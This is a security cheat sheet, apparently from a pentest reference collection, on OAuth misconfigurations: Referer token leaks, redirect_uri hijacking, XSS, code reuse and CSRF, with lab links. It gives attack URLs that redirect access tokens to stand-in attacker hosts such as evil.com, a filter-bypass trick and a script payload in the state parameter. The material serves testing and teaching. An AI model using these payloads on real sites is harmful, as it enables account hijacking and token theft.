<!--
 * [业务问题]: OAuth 配置错误是现代 Web 应用中的高危漏洞，攻击者可以通过操纵 redirect_uri、窃取 access token、利用 CSRF 或绕过状态验证来劫持用户账户、获取敏感数据或执行未经授权的操作。常见于 SSO 单点登录和第三方授权场景。
 * [实现逻辑]: 本文档详细介绍了 OAuth 实现中的多种安全缺陷，包括通过 Referer 头窃取 Token、redirect_uri 劫持、XSS 执行、私钥泄露、授权码重用以及 CSRF 攻击等，并提供了真实案例和 PortSwigger 实验室链接。
 -->

# OAuth Misconfiguration (OAuth 配置错误)

> OAuth 是一个广泛使用的授权框架，允许第三方应用程序在不暴露用户凭据的情况下访问用户数据。然而，OAuth 的不当配置和实现可能导致严重的安全漏洞。本文档探讨了常见的 OAuth 配置错误、潜在的攻击向量以及缓解这些风险的最佳实践。

## 概要 (Summary)

- [Stealing OAuth Token via referer](#stealing-oauth-token-via-referer)
- [Grabbing OAuth Token via redirect_uri](#grabbing-oauth-token-via-redirect---uri)
- [Executing XSS via redirect_uri](#executing-xss-via-redirect---uri)
- [OAuth private key disclosure](#oauth-private-key-disclosure)
- [Authorization Code Rule Violation](#authorization-code-rule-violation)
- [Cross-Site Request Forgery](#cross-site-request-forgery)
- [Labs](#labs)
- [References](#references)


## Stealing OAuth Token via referer

> Do you have HTML injection but can't get XSS? Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)


## Grabbing OAuth Token via redirect_uri

Redirect to a controlled domain to get the access token

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

Redirect to an accepted Open URL in to get the access token

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

OAuth implementations should never whitelist entire domains, only a few URLs so that “redirect_uri” can’t be pointed to an Open Redirect.

Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```


## Executing XSS via redirect_uri

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```


## OAuth private key disclosure

Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.


## Authorization Code Rule Violation

> The client MUST NOT use the authorization code  more than once.  

If an authorization code is used more than once, the authorization server MUST deny the request 
and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.


## Cross-Site Request Forgery

Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). This URL can be used in CSRF attacks.

> The client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state. The client SHOULD utilize the "state" request parameter to deliver this value to the authorization server when making an authorization request.


## Labs

* [PortSwigger - Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
* [PortSwigger - Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
* [PortSwigger - OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
* [PortSwigger - Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
* [PortSwigger - Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)


## References

- [All your Paypal OAuth tokens belong to me - asanso - November 28, 2016](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html) 
- [OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - asanso - April 8, 2014](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
- [How I hacked Github again - Egor Homakov - February 7, 2014](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
- [How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka - September 16, 2014](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)
- [Bypassing Google Authentication on Periscope's Administration Panel - Jack Whitton - July 20, 2015](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)